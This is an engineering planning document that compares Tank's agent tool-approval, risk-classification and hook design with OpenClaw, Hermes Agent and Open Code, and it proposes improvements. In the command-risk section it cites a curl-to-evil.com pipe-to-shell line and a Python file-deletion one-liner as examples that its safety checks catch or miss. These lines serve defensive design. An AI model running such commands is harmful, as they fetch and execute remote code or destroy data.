# Agentic Harness Patterns: Research & Improvement Plan

Comparative analysis of Tank vs. OpenClaw, Hermes Agent, and Open Code across four agentic harness patterns.

---

## 1. Progressive Tool Expansion

**Pattern**: Tools/permissions gradually expand based on context, trust level, or session history.

### How Others Do It

**OpenClaw** — Multi-layered trust escalation:
- `ExecSecurity` enum: `deny → allowlist → full` — a ladder the agent can climb
- `ExecAsk` modes: `off | on-miss | always` — controls when the user is prompted
- `allow-always` durable approvals: once the user approves a specific command, it's persisted in `exec-approvals.json` with a binding (argv + cwd + env hash), so next session it auto-allows
- Per-agent security config: different agents get different trust ceilings (`agents.list[].tools.exec.security`)
- Safe-bin profiles: known-safe executables (git, ls, cat) are pre-analyzed and allowed without prompt

**Hermes Agent** — Toolset composition + runtime gating:
- Composable toolsets: `"debugging"` includes `["terminal", "process"]` + `web` + `file`
- `check_fn` gating: tools only appear in schema if their runtime conditions are met (e.g., `send_message` only when gateway is running, `ha_*` only when HASS_TOKEN exists)
- Platform-scoped toolsets: `hermes-cli` vs `hermes-telegram` vs `hermes-acp` — same agent, different tool surfaces depending on deployment context
- Dynamic toolset creation via `create_custom_toolset()` at runtime

**Open Code** — Permission ruleset with pattern matching:
- Three actions: `allow | deny | ask`
- Rules are `{permission, pattern, action}` — evaluated last-match-wins against rulesets
- `autoRespondsPermission()` — sessions inherit their parent session's auto-accept state
- Directory-scoped auto-accept: trust can be granted per project root

### Tank's Current State

- **Per-agent tool scoping exists**: `AgentDefinition.disallowed_tools` (frozenset) + `LLMAgent.tool_filter` (allowlist). Jobs use `blocked_tools` to restrict tool access. The `AgentRunner` applies `exclude_tools` at dispatch.
- **Connector-level durable approvals exist**: `DynamicAllowlistStore` (ORM-backed, SQLite) persists `allow_forever` grants for connector identities. Admin clicks "Allow forever" → persisted row → auto-allows on next session.
- **Job-level approval modes**: Jobs select `always_approve` or `always_deny` via `AlwaysApproveResolver` / `AlwaysDenyResolver` — trusted autonomous jobs skip all prompts.
- **Pending approval persistence**: `PendingToolCallStore.to_list()` serializes pending approvals into the conversation state, restored on session resume.
- **No command-level durable approvals**: The dynamic allowlist covers connector identities (who can talk to the agent), NOT specific tool commands. Once a session ends, approved `run_command` decisions are lost.
- **No composable toolset profiles**: Tool scoping is per-agent-definition (disallowed list) or per-LLM-agent (filter list), but there's no named "toolset" concept that composes groups.

### Gaps & Improvements

| # | Improvement | Effort | Impact |
|---|-------------|--------|--------|
| 1.1 | **Durable command approval persistence** — Save approved command patterns (e.g., `git push`, `docker build`) to disk, restore on next session. The connector `DynamicAllowlistStore` already proves the pattern — extend it to tool/command approvals. Like OpenClaw's `exec-approvals.json`. | Medium | High |
| 1.2 | **Composable toolset profiles** — Define named tool subsets (e.g., `safe`, `research`, `full`) in config.yaml that compose existing tool groups. Agents and jobs reference profiles by name instead of maintaining independent disallowed-lists. Like Hermes toolsets. | Medium | Medium |
| 1.3 | **Conditional tool registration** — Tools declare prerequisites (env vars, config flags) and only appear in schema when conditions are met. Like Hermes `check_fn`. Tank's `ToolGroup.create_tools()` is close but conditions are checked at group level, not per-tool. | Low | Medium |
| 1.4 | **Trust escalation within a session** — After N successful approvals of the same tool+pattern, auto-promote to `always_approve` for the remainder of the session. The current system re-prompts every time for `REQUIRE_APPROVAL` commands. | Low | Low |

---

## 2. Command Risk Classification

**Pattern**: Commands are analyzed and classified by risk level before execution, using static analysis, allowlists, and/or LLM evaluation.

### How Others Do It

**OpenClaw** — Deep static analysis pipeline:
- `analyzeShellCommand()` — parses commands into segments, resolves executables, detects shell wrappers
- `DEFAULT_SAFE_BINS` — curated list of binaries known to be safe (read-only tools)
- `SafeBinProfile` — per-binary arg validation rules (e.g., `git` is safe, but `git push --force` might not be)
- `validateSafeBinArgv()` — checks that arguments to safe binaries don't escape safety (no `--exec`, no shell expansions)
- `isTrustedSafeBinPath()` — verifies the resolved binary path is in a trusted location
- Multi-factor decision: `analysisOk && allowlistSatisfied && !shellWrapperBlocked` → allowed
- Shell wrapper detection: `bash -c`, `sh -lc`, `cmd.exe /c` get special treatment — the inner command is what's actually evaluated

**Hermes Agent** — Tool guardrails with loop detection:
- `IDEMPOTENT_TOOL_NAMES` vs `MUTATING_TOOL_NAMES` — classification of tools by side-effect profile
- `ToolCallGuardrailController` — tracks per-turn tool call patterns, detects:
  - Exact repeated failures (same tool + same args failing N times)
  - Same-tool failures (same tool failing regardless of args)
  - Idempotent no-progress (read-only tool returning identical results)
- Configurable thresholds: `warn_after` and `hard_stop_after` for each detection type
- `classify_tool_failure()` — determines if a tool result represents success or failure
- Decisions: `allow → warn → block → halt` — progressive restriction

**Open Code** — Permission-pattern matching:
- Edit tools (`edit`, `write`, `apply_patch`) are identified and given special permission treatment
- Wildcard pattern matching: `Wildcard.match(permission, rule.permission)` against rulesets
- `disabled()` function: tools whose `*` pattern has `deny` action are completely removed from the tool list

### Tank's Current State

- **ToolApprovalPolicy** routes by tool category: `COMMAND_TOOLS → CommandSecurityPolicy`, `FILE_TOOLS → FileAccessPolicy`, `WEB_TOOLS → NetworkAccessPolicy`, others → `ALLOW`
- **Three-way verdict** (`ALLOW | REQUIRE_APPROVAL | DENY`) — well-designed
- **Built-in safe-command allowlist already exists**: `SAFE_COMMANDS` frozenset (~60 commands: ls, cat, grep, git, curl, etc.) + `GIT_SAFE_SUBCOMMANDS` (status, log, diff, etc.) in `command_security.py`. Config supports `extra_safe_commands` and `always_require_approval` overrides.
- **Dangerous-pattern detection exists**: `DANGEROUS_PATTERNS` (~20 regexes covering rm -rf, git force push, fork bombs, SQL DROP, etc.) + config `extra_dangerous_patterns`.
- **Shell command parsing exists**: `_split_compound()` splits on `&&`, `||`, `;`, `|`. `_extract_base_command()` handles env prefixes, variable assignments, absolute paths. `_extract_find_inner_commands()` recursively evaluates `find -exec` payloads. Shell wrapper detection (`sh -c`, `bash -c`) extracts inner commands.
- **LLM fallback for unknown commands**: When a command isn't in safe/dangerous lists, optional LLM evaluation (3s timeout) classifies it as SAFE/UNSAFE.
- **File access policy with specificity scoring**: Rules match path patterns with `fnmatch` globs (`**`, `*`), scored by specificity (exact > single glob > recursive glob), per-operation levels (read/write/delete).
- **Network access policy**: Host-pattern rules with `fnmatch` wildcards, first-match-wins.
- **No tool loop guardrails**: `MAX_TOOL_ITERATIONS = 100` in LLM + `MAX_GRAPH_ITERATIONS = 5` in AgentGraph cap total iterations but do NOT detect repeated identical failures or no-progress patterns.
- **No argument-level risk awareness for safe commands**: `git` is checked at subcommand level, but other safe commands (curl, python, make) are auto-allowed regardless of arguments. `curl http://evil.com | sh` is caught by the dangerous-pattern regex, but `python -c "import os; os.remove('/')"` would pass as "safe command: python".

### Gaps & Improvements

| # | Improvement | Effort | Impact |
|---|-------------|--------|--------|
| 2.1 | **Tool loop guardrails** — Track repeated identical failures and no-progress patterns. Inject warnings into the LLM context after 2 failures, block after 5. Like Hermes `ToolCallGuardrailController`. The current `MAX_TOOL_ITERATIONS=100` is a crude cap, not a smart detector. | Medium | High |
| 2.2 | **Tool idempotency classification** — Tag each tool as `idempotent` or `mutating`. Use this for loop detection and for smarter retry/caching behavior. | Low | Medium |
| 2.3 | **Safe-bin argument validation** — For commands in the safe list, validate that arguments don't escape safety. E.g., `python` is safe but `python -c "os.remove(...)"` is not. Like OpenClaw's `SafeBinProfile` + `validateSafeBinArgv()`. | Medium | Medium |
| 2.4 | **Configurable warn/block thresholds** — Expose guardrail thresholds in `config.yaml` (like Hermes `tool_loop_guardrails.warn_after` / `hard_stop_after`). | Low | Low |

---

## 3. Single-Purpose Tool Design

**Pattern**: Each tool does one thing well, with clear input/output contracts and no hidden side effects.

### How Others Do It

**Open Code** — Type-safe tool definition:
- `tool()` factory with Zod schema validation for args
- `ToolContext` provides session metadata, abort signal, `metadata()` callback, and `ask()` for permission requests — tools don't manage their own context
- `ToolResult` is either `string` or `{title, output, metadata, attachments}` — explicit, structured
- Tool handlers are async functions that receive typed args + context — no class hierarchy

**Hermes Agent** — Function-level tools with a shared registry:
- Each tool is a standalone function registered in a registry
- Tools return structured results (JSON-serializable)
- `tool_result_classification.py` — separate module to classify what a tool returned (success vs error) based on the tool's known output patterns
- Clear separation: tools don't know about the LLM, the LLM doesn't know about tool internals

**OpenClaw** — Approval surface as first-class concept:
- `ExecApprovalRequestPayload` — rich metadata attached to every command execution request (command preview, analysis, warning text, command spans for UI highlighting)
- Commands have explicit `commandPreview` vs `command` — one for display, one for execution
- `SystemRunApprovalBinding` — captures the full context of a command (argv, cwd, agent, session, env hash) so the same approval applies to the same contextual invocation

### Tank's Current State

- **Good**: `BaseTool` ABC with `get_info() → ToolInfo` and `execute() → ToolResult | str` — clean separation
- **Good**: `ToolResult` dataclass with `content` (LLM sees), `display` (UI sees), `error` (flag) — well-structured
- **Good**: Tool groups for shared dependencies — no tool instantiates its own deps
- **Good**: `ToolContext` dataclass exists (Phase 18) — tools opt in via `ctx: ToolContext` in their signature, `ToolManager` injects it via `TOOL_CONTEXT_KWARG` introspection. Currently provides `media_store` and `session_id`.
- **Weakness**: Some tools are large (web_fetch handles HTML, PDF, JSON, RSS — multiple responsibilities in one tool)
- **Weakness**: No tool metadata beyond `ToolInfo` (name, description, parameters) — no idempotency tags, no risk level, no capability declarations. Risk classification lives in `approval.py` as hardcoded frozensets (`COMMAND_TOOLS`, `FILE_TOOLS`, `WEB_TOOLS`) rather than on the tool itself.

### Gaps & Improvements

| # | Improvement | Effort | Impact |
|---|-------------|--------|--------|
| 3.1 | **Tool metadata annotations** — Add optional fields to `ToolInfo` or a sibling `ToolMetadata`: `risk_level`, `idempotent`, `requires_network`, `requires_filesystem`, `category`. Move the hardcoded `COMMAND_TOOLS`/`FILE_TOOLS`/`WEB_TOOLS` sets from `approval.py` into self-declarations on each tool. Used by policies and guardrails. | Low | Medium |
| 3.2 | **Extend ToolContext** — Currently limited to `media_store` + `session_id`. Add `bus` (for tools to emit events), `abort_signal` (for cancellation), and `metadata_callback` (for tools to report progress/title). Like Open Code's `ToolContext.metadata()` and `ToolContext.abort`. | Low | Medium |
| 3.3 | **Tool capability declarations** — Tools declare what resources they need (network, filesystem, sandbox). ToolManager validates at registration. Also enables conditional disabling when infrastructure is absent. | Low | Medium |

---

## 4. Deterministic Lifecycle Hooks

**Pattern**: User-defined or system-defined callbacks fire at predictable points (before/after tool calls, on session events, on errors).

### How Others Do It

**Hermes Agent** — Full shell-hook bridge (`shell_hooks.py`):
- Config-driven: `hooks:` block in YAML defines `{event, command, matcher, timeout}`
- Events: `pre_tool_call`, `post_tool_call`, `pre_llm_call`, `post_llm_call`, `session_start`, etc.
- Matcher: regex against tool name — only fire for matching tools
- Wire protocol: JSON on stdin, JSON on stdout — scripts can `block` or inject `context`
- Consent system: first-use approval prompt, persisted allowlist (`shell-hooks-allowlist.json`)
- Composition: Python plugins and shell hooks both flow through `invoke_hook()` — same event system
- Timeout + error handling: timed subprocess, non-zero exits logged but don't crash the agent

**OpenClaw** — Event-driven hooks with source-based policy:
- Hook sources: `bundled | managed | workspace | plugin` — each with different trust levels
- `HookSourcePolicy`: defines precedence, whether it's trusted local code, default enable mode, and override rules
- Events system: hooks declare which events they handle (e.g., `["command:new", "session:start"]`)
- Enable state: workspace hooks are `explicit-opt-in` by default (untrusted), bundled hooks are `default-on`
- Override resolution: higher-precedence hooks can override lower-precedence ones for the same event

**Claude Code** (from reference data):
- `hooks/toolPermission/` — permission handlers that gate tool execution
- Handler types: `coordinatorHandler`, `interactiveHandler`, `swarmWorkerHandler` — different policies for different execution contexts
- Notification hooks: `useAutoModeUnavailableNotification`, `useRateLimitWarningNotification`, etc. — reactive hooks that fire on state transitions

### Tank's Current State

- **Bus/Observer system**: Processors post `BusMessage` to the Bus, observers subscribe — good for decoupled observability. Observers include: `LatencyObserver`, `InterruptLatencyObserver`, `TurnTracker`, `MetricsCollector`, `HealthMonitor`, `AlertingObserver`.
- **Pipeline events**: `PipelineEvent` (interrupt, flush, eos, qos) — bidirectional, deterministic, but internal-only (no user-extensible hooks).
- **Processor lifecycle**: `start()` / `stop()` / `handle_event()` — well-defined but not user-extensible.
- **Approval gate as interception point**: `ApprovalGateExecutor` wraps `ToolManager` and evaluates policy before every tool call — the only place where tool execution can be blocked at runtime.
- **Bus publishes policy decisions**: `FileAccessPolicy._publish()` and `NetworkAccessPolicy._publish()` post verdicts to the Bus. `AuditLogger.subscribe(bus)` already listens.
- **No user-defined hooks**: No way for users to define "before tool X runs, execute this script" or "after tool Y, log to external system".
- **No pre/post tool call extensibility**: The approval gate is the only interception, and it's binary (approve/reject based on internal policy). External scripts can't participate.
- **No `pre_llm_call` hook**: Can't inject context or modify prompts before LLM calls from external scripts.
- **No session lifecycle hooks**: No way to trigger external actions on session start/end, turn boundaries, etc.

### Gaps & Improvements

| # | Improvement | Effort | Impact |
|---|-------------|--------|--------|
| 4.1 | **Hook system for tool calls** — Define `pre_tool_call` and `post_tool_call` hooks that fire shell scripts or Python callables. Scripts receive tool name + args on stdin (JSON), can return `{action: "block", reason: "..."}` to prevent execution. The Bus infrastructure already exists — hooks register as a new observer type. Like Hermes `shell_hooks.py`. | High | High |
| 4.2 | **pre_llm_call hook** — Allow injecting context before LLM calls (e.g., "today is Friday", "user preference: concise answers"). Scripts return `{context: "..."}` which gets appended to the system prompt for that turn. | Medium | Medium |
| 4.3 | **Session lifecycle hooks** — `session_start`, `session_end`, `conversation_turn_start`, `conversation_turn_end`. Already partially represented as Bus messages in some observers — formalize as hook points. | Medium | Medium |
| 4.4 | **Hook configuration in config.yaml** — Declarative hook registration: event, command/script path, matcher (regex on tool name), timeout. Like Hermes `hooks:` config block. | Medium | High |
| 4.5 | **Hook consent/allowlist** — First-use approval for shell hooks, persisted to disk. Prevents supply-chain attacks through config injection. Like Hermes `shell-hooks-allowlist.json`. | Low | Medium |
| 4.6 | **Cost/usage hook** — Fire after each LLM call with token count + cost. Enables budget enforcement, alerts, or logging to external systems. Could be a Bus observer (no shell subprocess needed). | Low | Medium |

---

## Priority & Implementation Plan

### Phase 1: Quick Wins (Low effort, High/Medium impact)

1. **2.2 Tool idempotency classification** — Tag each tool as `idempotent` or `mutating` via a new `ToolInfo` field. Foundation for guardrails.
2. **3.1 Tool metadata annotations** — Extend `ToolInfo` with `risk_level`, `idempotent`, `category`. Move hardcoded category sets from `approval.py` to self-declarations.
3. **1.3 Conditional tool registration** — Add optional `is_available()` method to `BaseTool`. ToolManager skips tools that return False.
4. **3.2 Extend ToolContext** — Add `bus`, `abort_signal`, and `metadata_callback` to the existing `ToolContext` dataclass.

### Phase 2: Core Infrastructure (Medium effort, High impact)

5. **2.1 Tool loop guardrails** — Port Hermes `ToolCallGuardrailController` pattern. Track tool call signatures (name + args hash), warn after 2 identical failures, block after 5. Wire into `LLMAgent` or the `ApprovalGateExecutor` layer.
6. **1.1 Durable command approval persistence** — Extend the existing `DynamicAllowlistStore` pattern (or create a sibling `CommandApprovalStore`) to persist approved command patterns. Load on startup, match against new commands in `CommandSecurityPolicy`.
7. **2.3 Safe-bin argument validation** — For high-risk safe-list entries (python, curl, make), add argument pattern checks. Use the existing `_evaluate_segment` dispatch point.
8. **4.4 Hook configuration** — Add `hooks:` section to config.yaml. Parse into `HookSpec` dataclasses at startup.

### Phase 3: Full Hook System (High effort, High impact)

9. **4.1 Hook system for tool calls** — Shell subprocess bridge with JSON stdin/stdout protocol. `pre_tool_call` fires before `ApprovalGateExecutor.execute_openai_tool_call()`. `post_tool_call` fires after tool returns. Consent system via on-disk allowlist.
10. **4.2 pre_llm_call hook** — Context injection before `LLM.chat_stream()` calls.
11. **4.3 Session lifecycle hooks** — Fire on session boundaries. Piggyback on existing Bus events.
12. **1.2 Composable toolset profiles** — Named tool subsets in config.yaml, referenced by agent definitions and jobs.

### Phase 4: Advanced (Future)

13. **4.6 Cost/usage hook** — Post-LLM call cost Bus message. Observer pattern (no subprocess).
14. **2.4 Configurable guardrail thresholds** — Expose in config.yaml.
15. **4.5 Hook consent/allowlist** — Persistent approval for shell hooks.

---

## Design Principles (from the research)

1. **Three-way verdicts are right** — Tank already has `ALLOW | REQUIRE_APPROVAL | DENY`. This matches OpenClaw and Open Code. Keep it.

2. **Composition over inheritance** — Hermes toolsets and OpenClaw's per-agent configs show that tool availability should be compositional, not hardcoded. Tank's `disallowed_tools` + `tool_filter` is functional but inverted (blocklist vs allowlist). Named profiles would be cleaner.

3. **Durable approvals build trust** — Users shouldn't have to re-approve `git push` every session. Tank already has `DynamicAllowlistStore` for connector identities — the pattern just needs extending to command approvals.

4. **Shell hooks need consent** — Any mechanism that runs user scripts must have first-use approval and an allowlist. Hermes gets this right.

5. **Loop detection is essential** — Without guardrails, LLMs will retry failing tools indefinitely. Tank's `MAX_TOOL_ITERATIONS=100` is a blunt cap — it doesn't detect patterns. The Hermes pattern (warn at 2, block at 5) is battle-tested and detects the specific failure mode (identical args + identical error).

6. **Static analysis before LLM evaluation** — Tank already does this correctly: dangerous patterns → safe allowlist → LLM fallback. The pipeline is right; what's missing is argument-level validation for the safe list.

7. **Hooks should compose with existing Bus** — Tank's Bus/Observer is a strong foundation. Hooks should register as Bus observers and/or post decisions back to the Bus, so the existing `AuditLogger`, `AlertingObserver`, etc. can react to hook activity without any additional wiring.
